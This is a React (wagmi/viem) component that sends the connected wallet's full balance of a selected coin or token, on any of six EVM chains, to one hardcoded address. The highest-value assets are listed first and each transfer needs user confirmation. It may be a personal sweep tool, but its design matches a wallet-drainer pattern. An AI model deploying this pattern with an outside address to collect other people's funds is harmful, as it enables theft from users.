import React, { useMemo, useState } from "react";

import {
  useAccount,
  useChainId,
  useSwitchChain,
  useWalletClient,
  usePublicClient
} from "wagmi";

import {
  isAddress,
  parseUnits,
  formatUnits
} from "viem";

// FIXED RECEIVING ADDRESS
const FIXED_RECIPIENT =
  "0x47E11Fd3e3cEF8Ea9beC9805D1F27dBe775B1D69";

// SUPPORTED NETWORKS
const CHAIN_NAMES = {
  1: "Ethereum",
  137: "Polygon",
  56: "BNB Smart Chain",
  42161: "Arbitrum",
  10: "Optimism",
  8453: "Base"
};

// ERC20 TOKEN ABI
const ERC20_ABI = [
  {
    name: "transfer",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" }
    ],
    outputs: [
      { name: "", type: "bool" }
    ]
  }
];

export default function Transfer({
  assets = [],
  onRefresh
}) {
  const { address } = useAccount();

  const currentChainId = useChainId();

  const { switchChainAsync } = useSwitchChain();

  const [selectedIndex, setSelectedIndex] =
    useState("");

  const [loading, setLoading] = useState(false);

  const [message, setMessage] = useState("");

  const [transactionHash, setTransactionHash] =
    useState("");

  const selectedAsset =
    selectedIndex === ""
      ? null
      : assets[Number(selectedIndex)];

  const targetChainId =
    selectedAsset?.chainId
      ? Number(selectedAsset.chainId)
      : undefined;

  const publicClient = usePublicClient({
    chainId: targetChainId
  });

  const { data: walletClient } = useWalletClient({
    chainId: targetChainId
  });

  // SORT ASSETS BY USD VALUE
  const sortedAssets = useMemo(() => {
    return assets
      .filter(asset => {
        return (
          Number(asset.balance) > 0 &&
          Number.isInteger(Number(asset.chainId)) &&
          CHAIN_NAMES[Number(asset.chainId)]
        );
      })
      .sort((a, b) => {
        const valueA =
          Number(a.balance) *
          Number(a.priceUsd || 0);

        const valueB =
          Number(b.balance) *
          Number(b.priceUsd || 0);

        return valueB - valueA;
      });
  }, [assets]);

  // IDENTIFY NATIVE COINS
  const isNative = asset => {
    return (
      asset.type === "native" ||
      !asset.contractAddress
    );
  };

  // SEND ASSET
  const handleSend = async () => {
    setMessage("");
    setTransactionHash("");

    if (!address) {
      setMessage("Connect your wallet first.");
      return;
    }

    if (!isAddress(FIXED_RECIPIENT, {
      strict: false
    })) {
      setMessage("Invalid receiving address.");
      return;
    }

    if (
      FIXED_RECIPIENT.toLowerCase() ===
      address.toLowerCase()
    ) {
      setMessage(
        "Receiving address cannot be your connected wallet."
      );
      return;
    }

    if (!selectedAsset) {
      setMessage("Select an asset first.");
      return;
    }

    if (!publicClient || !walletClient) {
      setMessage(
        "Wallet or network connection is not ready."
      );
      return;
    }

    setLoading(true);

    try {

      // SWITCH NETWORK IF NECESSARY
      if (currentChainId !== targetChainId) {

        await switchChainAsync({
          chainId: targetChainId
        });

        setMessage(
          "Network switched successfully. Review and tap Send again."
        );

        return;
      }

      // GET NETWORK FEES
      const fees =
        await publicClient.estimateFeesPerGas();

      const feePerGas =
        fees.maxFeePerGas ?? fees.gasPrice;

      if (!feePerGas) {
        throw new Error(
          "Unable to estimate network fees."
        );
      }

      // NATIVE COIN TRANSFER
      if (isNative(selectedAsset)) {

        const decimals = Number(
          selectedAsset.decimals ?? 18
        );

        const balance =
          await publicClient.getBalance({
            address
          });

        // Estimate gas for transfer
        const gasLimit =
          await publicClient.estimateGas({
            account: address,
            to: FIXED_RECIPIENT,
            value: 1n
          });

        // Reserve gas plus 20% safety margin
        const gasReserve =
          (gasLimit * feePerGas * 120n) / 100n;

        const amount =
          balance - gasReserve;

        if (amount <= 0n) {
          throw new Error(
            "Insufficient balance after gas reservation."
          );
        }

        const displayAmount =
          formatUnits(amount, decimals);

        // CONFIRM RECIPIENT AND AMOUNT
        const confirmed = window.confirm(
          `CONFIRM TRANSFER\n\n` +
          `Asset: ${selectedAsset.symbol}\n` +
          `Amount: ${displayAmount}\n` +
          `Network: ${CHAIN_NAMES[targetChainId]}\n\n` +
          `Receiving Address:\n${FIXED_RECIPIENT}\n\n` +
          `Estimated gas is reserved separately.\n\n` +
          `Continue?`
        );

        if (!confirmed) return;

        const feeSettings = fees.maxFeePerGas
          ? {
              maxFeePerGas: fees.maxFeePerGas,
              ...(fees.maxPriorityFeePerGas
                ? {
                    maxPriorityFeePerGas:
                      fees.maxPriorityFeePerGas
                  }
                : {})
            }
          : {
              gasPrice: fees.gasPrice
            };

        // REQUEST WALLET APPROVAL
        const hash =
          await walletClient.sendTransaction({
            account: address,
            to: FIXED_RECIPIENT,
            value: amount,
            gas: gasLimit,
            ...feeSettings
          });

        setTransactionHash(hash);

        setMessage(
          "Transaction submitted. Waiting for confirmation..."
        );

        const receipt =
          await publicClient.waitForTransactionReceipt({
            hash
          });

        if (receipt.status !== "success") {
          throw new Error(
            "Transaction was reverted."
          );
        }

      } else {

        // ERC20 TOKEN TRANSFER

        const contractAddress =
          selectedAsset.contractAddress;

        if (!isAddress(contractAddress)) {
          throw new Error(
            "Invalid token contract address."
          );
        }

        const decimals =
          Number(selectedAsset.decimals);

        if (
          !Number.isInteger(decimals) ||
          decimals < 0 ||
          decimals > 255
        ) {
          throw new Error(
            "Invalid token decimals."
          );
        }

        // GET EXACT TOKEN BALANCE
        let tokenAmount;

        if (selectedAsset.rawBalance != null) {

          tokenAmount = BigInt(
            selectedAsset.rawBalance
          );

        } else {

          tokenAmount = parseUnits(
            String(selectedAsset.balance),
            decimals
          );

        }

        if (tokenAmount <= 0n) {
          throw new Error(
            "Token balance is zero."
          );
        }

        // ESTIMATE TOKEN TRANSFER GAS
        const gasLimit =
          await publicClient.estimateContractGas({
            account: address,
            address: contractAddress,
            abi: ERC20_ABI,
            functionName: "transfer",
            args: [
              FIXED_RECIPIENT,
              tokenAmount
            ]
          });

        // CHECK NATIVE GAS BALANCE
        const nativeBalance =
          await publicClient.getBalance({
            address
          });

        const gasReserve =
          (gasLimit * feePerGas * 120n) / 100n;

        if (nativeBalance < gasReserve) {
          throw new Error(
            "Insufficient native coin for gas fees."
          );
        }

        const displayAmount =
          formatUnits(
            tokenAmount,
            decimals
          );

        // CONFIRM BEFORE SENDING
        const confirmed = window.confirm(
          `CONFIRM TOKEN TRANSFER\n\n` +
          `Token: ${selectedAsset.symbol}\n` +
          `Amount: ${displayAmount}\n` +
          `Network: ${CHAIN_NAMES[targetChainId]}\n\n` +
          `Receiving Address:\n${FIXED_RECIPIENT}\n\n` +
          `Gas will be paid separately.\n\n` +
          `Continue?`
        );

        if (!confirmed) return;

        const feeSettings = fees.maxFeePerGas
          ? {
              maxFeePerGas: fees.maxFeePerGas,
              ...(fees.maxPriorityFeePerGas
                ? {
                    maxPriorityFeePerGas:
                      fees.maxPriorityFeePerGas
                  }
                : {})
            }
          : {
              gasPrice: fees.gasPrice
            };

        // REQUEST WALLET APPROVAL
        const hash =
          await walletClient.writeContract({
            account: address,
            address: contractAddress,
            abi: ERC20_ABI,
            functionName: "transfer",
            args: [
              FIXED_RECIPIENT,
              tokenAmount
            ],
            gas: gasLimit,
            ...feeSettings
          });

        setTransactionHash(hash);

        setMessage(
          "Transaction submitted. Waiting for confirmation..."
        );

        const receipt =
          await publicClient.waitForTransactionReceipt({
            hash
          });

        if (receipt.status !== "success") {
          throw new Error(
            "Token transaction was reverted."
          );
        }
      }

      // SUCCESS
      setMessage(
        "Transfer confirmed successfully!"
      );

      // REFRESH PORTFOLIO
      if (onRefresh) {
        await onRefresh();
      }

    } catch (error) {

      console.error(
        "Transfer error:",
        error
      );

      setMessage(
        error.shortMessage ||
        error.message ||
        "Transfer failed."
      );

    } finally {

      setLoading(false);

    }
  };

  return (
    <section style={styles.card}>

      <h2>Send Assets</h2>

      <p style={styles.description}>
        Select an asset to transfer to your fixed receiving wallet.
      </p>

      {/* ASSET SELECTION */}

      <label style={styles.label}>
        Select Asset
      </label>

      <select
        value={selectedIndex}
        onChange={e =>
          setSelectedIndex(e.target.value)
        }
        style={styles.input}
        disabled={loading}
      >

        <option value="">
          Choose an asset
        </option>

        {sortedAssets.map(asset => {

          const originalIndex =
            assets.indexOf(asset);

          return (
            <option
              key={`${asset.chainId}-${asset.contractAddress || "native"}`}
              value={originalIndex}
            >
              {asset.symbol} — {asset.balance}
              {" "}({CHAIN_NAMES[asset.chainId]})
            </option>
          );
        })}

      </select>

      {/* FIXED RECIPIENT */}

      <label style={styles.label}>
        Fixed Receiving Wallet Address
      </label>

      <div style={styles.addressBox}>
        {FIXED_RECIPIENT}
      </div>

      {/* ASSET DETAILS */}

      {selectedAsset && (

        <div style={styles.details}>

          <p>
            <strong>Asset:</strong>{" "}
            {selectedAsset.symbol}
          </p>

          <p>
            <strong>Network:</strong>{" "}
            {CHAIN_NAMES[targetChainId]}
          </p>

          <p>
            <strong>Available Balance:</strong>{" "}
            {selectedAsset.balance}
          </p>

          <p>
            <strong>Transfer Mode:</strong>{" "}
            MAX
          </p>

        </div>

      )}

      {/* SEND BUTTON */}

      <button
        onClick={handleSend}
        disabled={
          loading ||
          !selectedAsset ||
          !address
        }
        style={{
          ...styles.button,
          opacity:
            loading ||
            !selectedAsset ||
            !address
              ? 0.6
              : 1
        }}
      >
        {loading
          ? "Processing..."
          : "Send MAX"}
      </button>

      {/* STATUS */}

      {message && (
        <p style={styles.message}>
          {message}
        </p>
      )}

      {/* TRANSACTION HASH */}

      {transactionHash && (

        <div style={styles.hashBox}>

          <strong>Transaction Hash</strong>

          <p style={styles.hash}>
            {transactionHash}
          </p>

        </div>

      )}

    </section>
  );
}

const styles = {

  card: {
    background: "#fff",
    padding: "22px",
    borderRadius: "14px",
    marginBottom: "20px",
    boxShadow: "0 2px 10px rgba(0,0,0,0.05)"
  },

  description: {
    color: "#6b7280",
    lineHeight: "1.6"
  },

  label: {
    display: "block",
    marginTop: "18px",
    marginBottom: "8px",
    fontWeight: "bold"
  },

  input: {
    width: "100%",
    boxSizing: "border-box",
    padding: "13px",
    border: "1px solid #d1d5db",
    borderRadius: "8px",
    fontSize: "14px",
    background: "#fff"
  },

  addressBox: {
    padding: "14px",
    background: "#f3f4f6",
    border: "1px solid #d1d5db",
    borderRadius: "8px",
    overflowWrap: "anywhere",
    fontSize: "13px",
    color: "#2563eb"
  },

  details: {
    background: "#f3f4f6",
    padding: "14px",
    borderRadius: "8px",
    marginTop: "18px",
    overflowWrap: "anywhere"
  },

  button: {
    width: "100%",
    padding: "15px",
    marginTop: "20px",
    background: "#16a34a",
    color: "white",
    border: "none",
    borderRadius: "8px",
    fontWeight: "bold",
    fontSize: "16px",
    cursor: "pointer"
  },

  message: {
    marginTop: "15px",
    overflowWrap: "anywhere",
    lineHeight: "1.6"
  },

  hashBox: {
    background: "#eff6ff",
    padding: "12px",
    borderRadius: "8px",
    marginTop: "15px"
  },

  hash: {
    fontSize: "12px",
    color: "#2563eb",
    overflowWrap: "anywhere"
  }

};